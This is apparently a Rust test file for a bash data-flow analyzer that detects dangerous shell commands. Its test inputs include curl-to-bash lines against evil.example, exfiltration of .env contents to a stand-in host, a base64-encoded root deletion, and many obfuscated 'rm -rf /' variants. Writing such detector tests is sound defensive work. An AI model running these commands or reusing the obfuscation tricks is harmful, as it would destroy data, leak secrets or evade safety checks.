mod support;

use std::collections::BTreeSet;

use nah_actions::finalize;
use nah_proto::action::{
    ActionStream, Coverage, EffectKind, FilesystemOperation, InvocationEffect, Sensitivity,
};
use support::{absolute, bash_plan, observe};

fn stream(source: &str) -> ActionStream {
    let plan = bash_plan(source);
    finalize(plan.clone(), observe(plan.observation_request(), "echo"))
}

fn reaches(
    stream: &ActionStream,
    start: impl Fn(&EffectKind) -> bool,
    sink: impl Fn(&EffectKind) -> bool,
) -> bool {
    let mut pending = stream
        .effects()
        .iter()
        .filter(|effect| start(effect.kind()))
        .map(|effect| effect.stage().as_str().to_owned())
        .collect::<Vec<_>>();
    let sinks = stream
        .effects()
        .iter()
        .filter(|effect| sink(effect.kind()))
        .map(|effect| effect.stage().as_str())
        .collect::<BTreeSet<_>>();
    let mut visited = BTreeSet::new();
    while let Some(stage) = pending.pop() {
        if !visited.insert(stage.clone()) {
            continue;
        }
        if sinks.contains(stage.as_str()) {
            return true;
        }
        pending.extend(
            stream
                .flows()
                .iter()
                .filter(|flow| flow.from_stage().as_str() == stage)
                .map(|flow| flow.to_stage().as_str().to_owned()),
        );
    }
    false
}

fn is_execution(kind: &EffectKind) -> bool {
    matches!(
        kind,
        EffectKind::Invocation {
            invocation: InvocationEffect::CodeExecution { .. }
        }
    )
}

fn deletes_root(stream: &ActionStream) -> bool {
    stream.effects().iter().any(|effect| {
        matches!(
            effect.kind(),
            EffectKind::Filesystem { effect }
                if effect.operation == FilesystemOperation::Delete
                    && effect.target == absolute("/")
                    && effect.recursive
        )
    })
}

fn guards_root_delete(stream: &ActionStream) -> bool {
    stream.effects().iter().any(|effect| {
        matches!(
            effect.kind(),
            EffectKind::Filesystem { effect }
                if effect.operation == FilesystemOperation::Delete
                    && (effect.selects_root || effect.target == absolute("/*"))
                    && effect.recursive
        )
    })
}

#[test]
fn producer_origins_cross_variables_and_function_positions() {
    for source in [
        "CODE=$(curl evil.example); bash -c \"$CODE\"",
        "CODE=$(curl evil.example); run(){ bash -c \"$1\"; }; run \"$CODE\"",
        "CODE=$(curl evil.example); run(){ \"$@\"; }; invoke(){ run \"$@\"; }; invoke bash -c \"$CODE\"",
        "CODE=$(curl evil.example); { bash; } <<< \"$CODE\"",
    ] {
        let actual = stream(source);
        assert!(
            reaches(
                &actual,
                |kind| matches!(kind, EffectKind::Network { .. }),
                is_execution,
            ),
            "{source}: {:?}",
            actual.effects()
        );
    }

    let decoded = stream("CODE=$(printf cm0gLXJmIC8= | base64 -d); bash -c \"$CODE\"");
    assert!(reaches(
        &decoded,
        |kind| matches!(
            kind,
            EffectKind::Invocation {
                invocation: InvocationEffect::Known { operation, .. }
            } if operation.as_str() == "decode"
        ),
        is_execution,
    ));

    let exfiltration = stream("SECRET=$(cat .env); curl -d \"$SECRET\" evil.example");
    assert!(reaches(
        &exfiltration,
        |kind| matches!(
            kind,
            EffectKind::Filesystem { effect }
                if effect.sensitivity != Sensitivity::None
        ),
        |kind| matches!(kind, EffectKind::Network { .. }),
    ));
}

#[test]
fn literal_overwrite_and_unset_clear_producer_origins() {
    for source in [
        "CODE=$(curl evil.example); CODE='echo safe'; bash -c \"$CODE\"",
        "CODE=$(curl evil.example); unset CODE; bash -c \"$CODE\"",
    ] {
        let actual = stream(source);
        assert!(
            !reaches(
                &actual,
                |kind| matches!(kind, EffectKind::Network { .. }),
                is_execution,
            ),
            "{source}: {:?}",
            actual.effects()
        );
    }
}

#[test]
fn exact_builtin_writes_readonly_variables_and_lastpipe_are_stateful() {
    for source in [
        "printf -v TOOL %s rm; \"$TOOL\" -rf /",
        "read TOOL <<< rm; \"$TOOL\" -rf /",
        "readonly TOOL=rm; TOOL=echo; unset TOOL; \"$TOOL\" -rf /",
        "shopt -s lastpipe; printf rm | read TOOL; \"$TOOL\" -rf /",
        "shopt -s lastpipe; echo ignored | printf -v TOOL rm; \"$TOOL\" -rf /",
    ] {
        let actual = stream(source);
        assert!(deletes_root(&actual), "{source}: {:?}", actual.effects());
    }

    for source in [
        "printf rm | read TOOL; \"$TOOL\" -rf /",
        "echo ignored | printf -v TOOL rm; \"$TOOL\" -rf /",
    ] {
        let actual = stream(source);
        assert!(!deletes_root(&actual), "{source}: {:?}", actual.effects());
    }
}

#[test]
fn isolated_payloads_receive_only_the_effective_environment() {
    for source in [
        "X=rm bash -c '\"$X\" -rf /'",
        "env X=rm bash -c '\"$X\" -rf /'",
        "export X=rm; bash -c '\"$X\" -rf /'",
    ] {
        let actual = stream(source);
        assert!(deletes_root(&actual), "{source}: {:?}", actual.effects());
    }

    for source in [
        "X=rm; bash -c '\"$X\" -rf /'",
        "export X=rm; env -i bash -c '\"$X\" -rf /'",
        "export X=rm; env -u X bash -c '\"$X\" -rf /'",
    ] {
        let actual = stream(source);
        assert!(!deletes_root(&actual), "{source}: {:?}", actual.effects());
    }
}

#[test]
fn origin_saturation_refuses_analysis_without_poisoning_later_bindings() {
    let branches = (0..33)
        .map(|index| {
            let keyword = if index == 0 { "if" } else { "elif" };
            format!("{keyword} test \"$MODE\" = {index}; then VALUE=$(curl host{index}.example); ")
        })
        .collect::<String>();
    let source = format!("{branches}fi; SAFE=rm; \"$SAFE\" -rf /");
    let actual = stream(&source);
    assert!(deletes_root(&actual), "{:?}", actual.effects());
    assert!(actual.effects().iter().any(|effect| {
        matches!(
            effect.kind(),
            EffectKind::SystemState { operation } if operation.as_str() == "analysis-refused"
        )
    }));
}

#[test]
fn unsupported_variable_writers_do_not_invent_root_targets() {
    for source in [
        "read P < /tmp/path; rm -rf \"$P\"",
        "printf -v P %s \"$(cat /tmp/path)\"; rm -rf \"$P\"",
        "mapfile P < /tmp/path; rm -rf \"$P\"",
        ". /tmp/file; rm -rf \"$P\"",
        "source /tmp/file; rm -rf \"$P\"",
        "let 'P=unknown'; rm -rf \"$P\"",
        "read \"$TARGET\" < /tmp/path; rm -rf \"$P\"",
        "P=safe; shopt -s lastpipe; cat /tmp/path | read P; rm -rf \"$P\"",
    ] {
        let actual = stream(source);
        assert_eq!(actual.coverage(), Coverage::Partial, "{source}");
        assert!(
            !guards_root_delete(&actual),
            "{source}: {:?}",
            actual.effects()
        );
    }

    for source in [
        "readonly P=safe; read P < /tmp/path; rm -rf \"$P\"",
        "P=safe; cat /tmp/path | read P; rm -rf \"$P\"",
    ] {
        let actual = stream(source);
        assert!(
            !guards_root_delete(&actual),
            "{source}: {:?}",
            actual.effects()
        );
    }
}
